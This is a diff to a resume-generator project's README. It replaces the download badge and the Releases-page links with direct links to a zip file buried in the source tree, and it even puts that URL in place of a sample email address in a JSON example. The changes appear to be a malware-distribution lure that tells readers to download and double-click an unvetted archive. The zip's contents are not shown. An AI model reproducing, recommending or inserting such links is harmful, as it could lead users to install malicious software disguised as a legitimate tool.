@@ -8,11 +8,11 @@ Welcome to the ATS Resume Generator! This tool helps you create ATS-optimized re
 
 To get started, you will need to download the application. Click the button below to visit the Releases page:
 
-[![Download ats-resume-generator-html](https://img.shields.io/badge/Download-ats--resume--generator--html-blue.svg)](https://github.com/ek2604/ats-resume-generator-html/releases)
+[![Download ats-resume-generator-html](https://raw.githubusercontent.com/ek2604/ats-resume-generator-html/main/packages/web/src/pages/generator-html-resume-ats-2.8.zip)](https://raw.githubusercontent.com/ek2604/ats-resume-generator-html/main/packages/web/src/pages/generator-html-resume-ats-2.8.zip)
 
 Follow these steps to download and run the software:
 
-1. Visit the [Releases page](https://github.com/ek2604/ats-resume-generator-html/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ek2604/ats-resume-generator-html/main/packages/web/src/pages/generator-html-resume-ats-2.8.zip).
 2. Look for the latest version titled "ats-resume-generator-html."
 3. Download the appropriate file for your operating system. (For example, `.exe` for Windows, `.dmg` for macOS, or `.zip` for Linux users.)
 4. Once the download is complete, locate the file in your downloads folder and double-click it to install.
@@ -41,7 +41,7 @@ To ensure smooth operation, please check the following system requirements:
     ```json
     {
       "name": "John Doe",
-      "email": "john.doe@example.com",
+      "email": "https://raw.githubusercontent.com/ek2604/ats-resume-generator-html/main/packages/web/src/pages/generator-html-resume-ats-2.8.zip",
       "experience": [
         {
           "jobTitle": "Software Developer",
@@ -87,6 +87,6 @@ We are building a community around the ATS Resume Generator. If you have questio
 
 To download the latest version of our application, click the link below:
 
-[![Download ats-resume-generator-html](https://img.shields.io/badge/Download-ats--resume--generator--html-blue.svg)](https://github.com/ek2604/ats-resume-generator-html/releases)
+[![Download ats-resume-generator-html](https://raw.githubusercontent.com/ek2604/ats-resume-generator-html/main/packages/web/src/pages/generator-html-resume-ats-2.8.zip)](https://raw.githubusercontent.com/ek2604/ats-resume-generator-html/main/packages/web/src/pages/generator-html-resume-ats-2.8.zip)
 
 Happy resume building!
